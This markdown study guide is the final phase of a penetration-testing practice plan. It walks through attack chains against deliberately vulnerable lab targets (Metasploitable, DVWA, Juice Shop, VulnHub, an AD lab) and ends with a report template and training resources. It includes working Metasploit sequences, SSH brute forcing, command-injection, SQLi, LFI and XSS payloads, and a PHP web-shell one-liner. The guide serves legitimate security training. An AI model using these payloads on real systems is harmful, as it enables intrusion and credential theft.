# 🎯 Phase 8: Full Attack Chains (Week 14+)

> **Goal**: Tie all skills together into complete, end-to-end penetration tests.
> **Your existing notes**: `attacks/attack_chain.md`

---

## 📋 Table of Contents

1. [Penetration Testing Methodology](#1-penetration-testing-methodology)
2. [Challenge 1: Metasploitable Full Compromise](#2-challenge-1-metasploitable-full-compromise)
3. [Challenge 2: DVWA All Vulnerabilities](#3-challenge-2-dvwa-all-vulnerabilities)
4. [Challenge 3: Juice Shop Comprehensive](#4-challenge-3-juice-shop-comprehensive)
5. [Challenge 4: VulnHub Machines](#5-challenge-4-vulnhub-machines)
6. [Challenge 5: Active Directory Attack Chain](#6-challenge-5-active-directory-attack-chain)
7. [Challenge 6: Multi-Machine Pivot Attack](#7-challenge-6-multi-machine-pivot-attack)
8. [Report Writing Template](#8-report-writing-template)
9. [Practice on Online Platforms](#9-practice-on-online-platforms)
10. [Continued Learning Path](#10-continued-learning-path)
11. [Master Checklist](#11-master-checklist)

---

## 1. Penetration Testing Methodology

### Standard Attack Flow

```
┌─────────────────────┐
│ 1. RECONNAISSANCE   │  Passive/active info gathering
│    (Phase 1 skills) │  Nmap, OSINT, service enumeration
├─────────────────────┤
│ 2. VULNERABILITY    │  Identify weaknesses
│    ANALYSIS         │  Nmap scripts, Searchsploit, Nikto
├─────────────────────┤
│ 3. EXPLOITATION     │  Gain initial access
│    (Phase 2 skills) │  Metasploit, manual exploits, web vulns
├─────────────────────┤
│ 4. POST-EXPLOITATION│  Enumerate from inside
│    (Phase 3 skills) │  Transfer tools, harvest credentials
├─────────────────────┤
│ 5. PRIV ESCALATION  │  Become root/SYSTEM
│    (Phase 4-5)      │  SUID, sudo, tokens, services
├─────────────────────┤
│ 6. LATERAL MOVEMENT │  Move to other machines
│    (Phase 6-7)      │  Pivoting, tunneling, pass-the-hash
├─────────────────────┤
│ 7. PERSISTENCE      │  Maintain access
│    (Phase 6 skills) │  Golden tickets, backdoors
├─────────────────────┤
│ 8. REPORTING        │  Document everything
│                     │  Professional pentest report
└─────────────────────┘
```

---

## 2. Challenge 1: Metasploitable Full Compromise

### Objective: Get root via 5 different attack paths

#### Path A: vsftpd 2.3.4 Backdoor (Port 21)

```bash
# Recon
nmap -sV -p 21 192.168.56.20

# Exploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
run

# Post-exploitation
whoami
cat /etc/shadow
```

#### Path B: Samba Exploitation (Port 139/445)

```bash
# Recon
nmap --script smb-vuln* -p 445 192.168.56.20

# Exploit
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.20
run
```

#### Path C: Tomcat Manager (Port 8180)

```bash
# Recon
nmap -sV -p 8180 192.168.56.20

# Brute force Tomcat manager
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.20
set RPORT 8180
run

# Deploy WAR shell
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.20
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
```

#### Path D: SSH Brute Force → PrivEsc

```bash
# Brute force SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ssh -t 4

# Login
ssh msfadmin@192.168.56.20

# Transfer LinPEAS
# On Kali: python3 -m http.server 8080
wget http://192.168.56.10:8080/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Find and exploit a privesc vector
# SUID binaries, writable /etc/passwd, kernel exploit, etc.
```

#### Path E: Unreal IRC Backdoor (Port 6667)

```bash
# Recon
nmap -sV -p 6667 192.168.56.20

# Exploit
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.20
run
```

**📝 Write a report for each path documenting your full process!**

---

## 3. Challenge 2: DVWA All Vulnerabilities

### Track Your Progress

| Vulnerability            |  Low  | Medium | High  |
| ------------------------ | :---: | :----: | :---: |
| Brute Force              |  [ ]  |  [ ]   |  [ ]  |
| Command Injection        |  [ ]  |  [ ]   |  [ ]  |
| CSRF                     |  [ ]  |  [ ]   |  [ ]  |
| File Inclusion (LFI/RFI) |  [ ]  |  [ ]   |  [ ]  |
| File Upload              |  [ ]  |  [ ]   |  [ ]  |
| SQL Injection            |  [ ]  |  [ ]   |  [ ]  |
| SQL Injection (Blind)    |  [ ]  |  [ ]   |  [ ]  |
| XSS (Reflected)          |  [ ]  |  [ ]   |  [ ]  |
| XSS (Stored)             |  [ ]  |  [ ]   |  [ ]  |
| XSS (DOM)                |  [ ]  |  [ ]   |  [ ]  |

### Quick References for Each Vulnerability

#### Command Injection

```bash
# Low: Simple command chaining
; cat /etc/passwd
| cat /etc/passwd
&& cat /etc/passwd

# Medium: Some characters filtered
| cat /etc/passwd          # pipe may still work

# High: Strict filtering
|cat /etc/passwd           # no space after pipe
```

#### SQL Injection

```sql
-- Low: Classic UNION injection
' OR 1=1 --
' UNION SELECT user, password FROM users --
1' UNION SELECT null, concat(user,':',password) FROM users #

-- Medium: Numeric input, use Burp to modify POST
1 OR 1=1
1 UNION SELECT user, password FROM users

-- High: Input from different page, change cookie
```

#### File Inclusion (LFI)

```
Low:  ?page=../../../../../../etc/passwd
Med:  ?page=....//....//....//etc/passwd  (double traversal)
High: ?page=file:///etc/passwd
```

#### File Upload

```bash
# Low: Upload PHP reverse shell directly
# Use /usr/share/webshells/php/php-reverse-shell.php

# Medium: Rename .php to .php.jpg or change Content-Type

# High: Embed PHP in image metadata + use LFI to execute
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

#### XSS (Reflected)

```html
<!-- Low -->
<script>alert('XSS')</script>

<!-- Medium — <script> blocked -->
<img src=x onerror=alert('XSS')>
<ScRiPt>alert('XSS')</ScRiPt>

<!-- High — more filtering -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

## 4. Challenge 3: Juice Shop Comprehensive

> Run: `docker run -d -p 3000:3000 bkimminich/juice-shop`
> Scoreboard: `http://localhost:3000/#/score-board`

### Challenge Categories

| Category  | ⭐ Easy                 | ⭐⭐ Medium            | ⭐⭐⭐ Hard              |
| --------- | ---------------------- | -------------------- | --------------------- |
| Injection | [ ] Login Admin (SQLi) | [ ] Login Bender     | [ ] Christmas Special |
| XSS       | [ ] DOM XSS            | [ ] Reflected XSS    | [ ] Persistent XSS    |
| Auth      | [ ] Password Strength  | [ ] Reset Jim's PW   | [ ] GDPR Erasure      |
| Exposure  | [ ] Confidential Doc   | [ ] Forgotten Backup | [ ] Exposed Metrics   |
| Misc      | [ ] Score Board        | [ ] Privacy Policy   | [ ] 5-star Feedback   |

### Key Techniques

```bash
# SQLi on Login
admin' OR 1=1 --
# Email: admin@juice-sh.op, Password: any

# Finding hidden files
curl http://localhost:3000/ftp/
# Download files from /ftp/

# API exploration
curl http://localhost:3000/api-docs
curl http://localhost:3000/rest/products/search?q=

# XSS in search
http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

---

## 5. Challenge 4: VulnHub Machines

### Beginner Track

| #   | Machine            | Difficulty | Focus                  |
| --- | ------------------ | ---------- | ---------------------- |
| 1   | Kioptrix Level 1   | ⭐          | Apache, Samba, OpenSSL |
| 2   | DC-1               | ⭐          | Drupal, SUID, sudo     |
| 3   | Basic Pentesting 1 | ⭐          | Web, SSH, PrivEsc      |
| 4   | Toppo              | ⭐          | Linux enumeration      |
| 5   | Bob 1.0.1          | ⭐          | Linux PrivEsc          |

### Intermediate Track

| #   | Machine         | Difficulty | Focus                     |
| --- | --------------- | ---------- | ------------------------- |
| 1   | Mr. Robot       | ⭐⭐         | WordPress, encoding, SUID |
| 2   | Stapler         | ⭐⭐         | Multiple vectors          |
| 3   | SickOs 1.2      | ⭐⭐         | Web exploitation          |
| 4   | HackLAB: Vulnix | ⭐⭐         | NFS, SSH, PrivEsc         |
| 5   | Brainpan        | ⭐⭐         | Buffer overflow           |

### Machine Walkthrough Approach

```
For EACH machine:
1. Start with nmap -sV -sC -oA initial_scan TARGET
2. Enumerate every open port
3. Research service versions with searchsploit
4. Try multiple attack paths
5. Get initial shell
6. Enumerate for privesc (LinPEAS/manual)
7. Escalate to root
8. Read the flag
9. WRITE A FULL REPORT (see template below)
```

---

## 6. Challenge 5: Active Directory Attack Chain

### Full AD Compromise Walkthrough

```
Step 1: External Reconnaissance
├── Nmap scan → find DC, web servers, file servers
├── Enumerate SMB shares (null session)
└── Enumerate LDAP (anonymous bind)

Step 2: Initial Access
├── Responder → capture NTLMv2 hashes
├── Crack hashes → get domain credentials
├── OR: Find web app vulnerability → shell
└── OR: Kerberoast → crack service account

Step 3: Internal Enumeration
├── BloodHound → find path to Domain Admin
├── PowerView → enumerate users, groups, GPOs
└── CrackMapExec → test credentials across network

Step 4: Lateral Movement
├── PSExec / WMIExec to other machines
├── Pass-the-Hash with captured NTLM hashes
└── Evil-WinRM to machines with WinRM enabled

Step 5: Privilege Escalation (Local)
├── WinPEAS → find misconfigurations
├── Token impersonation (PrintSpoofer/Potato)
└── Service exploitation

Step 6: Domain Admin Escalation
├── Kerberoast high-value service accounts
├── DCSync → dump all domain hashes
├── OR: Abuse ACLs found by BloodHound
└── OR: Unconstrained delegation abuse

Step 7: Domain Persistence
├── Golden Ticket → persistent Domain Admin
├── Silver Ticket → specific service access
└── Skeleton Key → universal password
```

---

## 7. Challenge 6: Multi-Machine Pivot Attack

```
Scenario Layout:
┌──────┐     ┌──────────┐     ┌──────────┐     ┌──────┐
│ Kali │────│ Web Srv  │────│ DB Srv   │────│  DC  │
│ .10  │     │ .20      │     │ .30      │     │ .40  │
└──────┘     └──────────┘     └──────────┘     └──────┘
 External     DMZ              Internal         Core

Attack Chain:
1. Enumerate Web Server from Kali
2. Exploit web application → get shell
3. Set up pivot through Web Server (Chisel/SSH)
4. Enumerate DB Server through pivot
5. Exploit database → get credentials
6. Set up double pivot through DB Server
7. Reach Domain Controller
8. Enumerate AD → escalate to Domain Admin
```

---

## 8. Report Writing Template

```markdown
# Penetration Test Report: [Machine Name]

## Executive Summary
Brief overview: initial access method, escalation path, impact.

## Scope
- Target: IP address / hostname
- Date: YYYY-MM-DD
- Tester: Your name

## Findings Summary
| #   | Finding         | Severity              | CVSS |
| --- | --------------- | --------------------- | ---- |
| 1   | [vulnerability] | Critical/High/Med/Low | X.X  |

## Detailed Findings

### Finding 1: [Vulnerability Name]
**Severity**: Critical
**CVSS**: 9.8
**Description**: What the vulnerability is
**Evidence**: Screenshots, command output
**Impact**: What an attacker could do
**Remediation**: How to fix it

## Attack Narrative
1. **Reconnaissance**: What scans you ran, what you found
2. **Exploitation**: Exact steps to gain access
3. **Post-Exploitation**: What you did after getting in
4. **Privilege Escalation**: How you got root/SYSTEM
5. **Proof**: Flag, screenshot of whoami/id

## Tools Used
- Nmap, Gobuster, Burp Suite, etc.

## Lessons Learned
What new techniques you practiced, what was challenging.
```

---

## 9. Practice on Online Platforms

### Comprehensive Practice Platforms

| Platform                | Type              | Best For              | Cost      |
| ----------------------- | ----------------- | --------------------- | --------- |
| **TryHackMe**           | Guided labs       | Beginners, all topics | Free tier |
| **HackTheBox**          | Unguided machines | Realistic practice    | Free tier |
| **PortSwigger Academy** | Web labs          | Web app security      | 100% Free |
| **VulnHub**             | Downloadable VMs  | Offline practice      | 100% Free |
| **PicoCTF**             | CTF challenges    | Mixed skills          | 100% Free |
| **OverTheWire**         | Wargames          | Linux fundamentals    | 100% Free |
| **CyberDefenders**      | DFIR challenges   | Blue team             | Free tier |
| **HackThisSite**        | Web challenges    | Web hacking basics    | 100% Free |
| **Exploit Education**   | Binary VMs        | Exploit development   | 100% Free |

### Recommended TryHackMe Learning Paths (Free Rooms)

```
Beginner Path:
1. Linux Fundamentals 1-3
2. Intro to Networking
3. Nmap
4. OWASP Top 10
5. Burp Suite Basics

Intermediate Path:
1. Metasploit Introduction
2. Blue (EternalBlue)
3. Steel Mountain
4. Alfred
5. Attacktive Directory

Advanced Path:
1. Wreath (pivoting network)
2. Throwback (AD network)
3. Buffer Overflow Prep
```

### PortSwigger Academy Progression

```
1. SQL Injection (all labs)
2. Cross-Site Scripting (all labs)
3. Authentication (all labs)
4. Directory Traversal
5. Command Injection
6. SSRF
7. File Upload
8. Access Control
```

---

## 10. Continued Learning Path

### After Completing All 8 Phases

```
Next Steps:
├── 🎓 Certifications
│   ├── CompTIA Security+ (foundational)
│   ├── eJPT (eLearnSecurity Junior PT, affordable)
│   ├── OSCP (Offensive Security Certified Professional)
│   └── PNPT (Practical Network Penetration Tester)
│
├── 🔧 Advanced Topics
│   ├── Web Application Security (deeper OWASP)
│   ├── Buffer Overflow / Binary Exploitation
│   ├── Malware Analysis
│   ├── Cloud Security (AWS/Azure pentesting)
│   └── Mobile Application Security
│
├── 💰 Bug Bounty Programs
│   ├── HackerOne (https://hackerone.com)
│   ├── Bugcrowd (https://bugcrowd.com)
│   └── Intigriti (https://intigriti.com)
│
└── 🏆 CTF Competitions
    ├── CTFtime.org (calendar of events)
    ├── SANS Holiday Hack Challenge (annual, free)
    └── National Cyber League (seasonal)
```

---

## 11. Master Checklist

### Phase Completion Tracker

- [ ] **Phase 1**: Information Gathering — completed all exercises
- [ ] **Phase 2**: Password Attacks — cracked hashes, brute forced services
- [ ] **Phase 3**: File Transfer — used 5+ transfer methods
- [ ] **Phase 4**: Linux PrivEsc — rooted Metasploitable + 1 VulnHub
- [ ] **Phase 5**: Windows PrivEsc — escalated on Windows target
- [ ] **Phase 6**: AD Attacks — compromised AD lab or TryHackMe room
- [ ] **Phase 7**: Tunneling — pivoted through at least 1 network
- [ ] **Phase 8**: Full Chains — completed challenges below

### Attack Chain Challenges
- [ ] Metasploitable: Compromised via 3+ different paths
- [ ] DVWA: Completed all vulns at Low level
- [ ] DVWA: Completed all vulns at Medium level
- [ ] DVWA: Completed all vulns at High level
- [ ] Juice Shop: Solved 15+ challenges
- [ ] VulnHub: Rooted 3+ beginner machines
- [ ] VulnHub: Rooted 1+ intermediate machine
- [ ] AD: Full attack chain (recon → Domain Admin)
- [ ] Multi-machine pivot exercise completed

### Reports Written
- [ ] Metasploitable full report
- [ ] At least 3 VulnHub machine reports
- [ ] AD attack chain report
- [ ] DVWA vulnerability documentation

### Online Platforms Used
- [ ] TryHackMe: 10+ rooms completed
- [ ] HackTheBox: 2+ machines completed
- [ ] PortSwigger: 10+ labs completed
- [ ] OverTheWire: Bandit completed (all levels)
- [ ] PicoCTF: 10+ challenges solved

---

> **Previous**: [Phase 7 — Port Redirection & Tunneling](../phase_7_tunneling/tunneling.md)
> **Start**: [README — Practice Plan Overview](../README.md) 🏠
